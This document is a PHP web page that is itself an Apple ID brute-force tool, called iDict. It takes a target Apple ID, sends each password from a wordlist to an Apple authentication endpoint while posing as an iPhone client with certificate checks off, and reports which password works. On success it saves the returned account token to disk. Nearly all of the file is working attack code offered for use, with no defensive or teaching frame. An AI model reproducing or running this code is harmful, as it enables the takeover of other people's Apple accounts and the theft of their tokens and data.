<!doctype html>
<html>
<head>
<meta charset="utf-8">

<title>iDict</title>

<link rel="icon" type="image/vnd.microsoft.icon"
     href="images/favicon.ico" />

<style type="text/css">
body {
    background-color: #242424;
}
table, th, td {
    border: 1px solid black;
}
h1 {
    color: #00ff00;
} 
</style>
</head>

<body>
<center>
<img src="images/Xoxo.jpg">





<br>
<b><h1>=================================================
<br>|  iDict Apple ID BruteForcer and Account Management Tool  |
<br>=================================================
<b><br>

<?php ob_implicit_flush(true);
ob_end_flush();
ini_set('max_execution_time', 0); //no server timeout limit ?> 





<?php

$appleid = $_REQUEST['txtFullName'];        

$plist = file_get_contents('./files/config.plist');
$xml = simplexml_load_string($plist);

$url = $xml->dict->dict->string[23];                      //the droid were looking for
         
$file_handle = fopen("./files/wordlist.txt", "r");

while (!feof($file_handle)) { 

$ch = curl_init();    

$line_of_text = fgets($file_handle); 
$password = rtrim($line_of_text);
  
$payload =
'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>apple-id</key>
	<string>'. $appleid .'</string>
	<key>client-id</key>
	<string></string>
	<key>delegates</key>
	<dict>
		<key>com.apple.gamecenter</key>
		<dict/>
		<key>com.apple.mobileme</key>
		<dict/>
		<key>com.apple.private.ids</key>
		<dict>
			<key>protocol-version</key>
			<string>4</string>
		</dict>
	</dict>
	<key>password</key>
	<string>'. $password .'</string>
</dict>
</plist>';




echo "Trying URL:<br>" . "~=~" . $url. "~=~" . "<br></b>";
  
echo "Trying Password:<br>" . "~=~" . $line_of_text . "~=~" . "<br><br>"; 


curl_setopt($ch, CURLOPT_URL,$url); 
curl_setopt($ch, CURLOPT_POST, true); 
curl_setopt($ch,CURLOPT_ENCODING, ''); 
curl_setopt($ch, CURLOPT_VERBOSE, true); 
curl_setopt($ch, CURLINFO_HEADER_OUT, true);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);    
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);   
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Accounts/113 CFNetwork/672.0.8 Darwin/14.0.0');  
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Proxy-Connection: keep-alive',
    'Accept: */*',
    'Accept-Encoding: gzip, deflate',               
    'Content-Type: text/plist',
    'Accept-Language: en-us',
    'X-MMe-Country: US',
    'X-MMe-Client-Info: <iPhone4,1> <iPhone OS;7.0.4;11B554a> <com.apple.AppleAccount/1.0 (com.apple.Accounts/113)>',
    'Content-length: ' . strlen($payload),
    'Connection: keep-alive'
));                                                

$got = 0;
$response = curl_exec($ch); 

$pos = 0;
$pos = strpos($response, "delegates");
if($pos > 0) {
	$got = 1;
	echo "<b>Password Found!!</b><br>";
}
         
$pos = 0;                              
$pos = strpos($response, "disabled");
if($pos > 0) {
	$got = 1;
	echo "<b>Account Blocked</b><br>";
	exit(0);
}

$pos = 0;
$pos = strpos($response, "incorrectly");
if($pos > 0) {
	$got = 1;
	echo "<b>Password Incorrect</b><br>";
}
 
if($got == 0) {
	echo $response;
	//echo "<br><br>Headers Debugging Info:<br></br>";
	//echo curl_getinfo($ch, CURLINFO_HEADER_OUT);
}

if ( $error = curl_error($ch) )
echo 'ERROR: ',$error;

curl_close($ch); 


if (strpos($response, "delegates") !== false)
    {
		echo "<center>Generating Token....</center>";
		file_put_contents('./token.plist', $response);
        echo "<center>Saved to Disk...</center>";
        die( "Success! The password is: {$line_of_text}" );
	
    }else{
    echo "Incorrect Trying Next<br>";
	
	}
}
fclose($file_handle);
?>


</body>
</html>
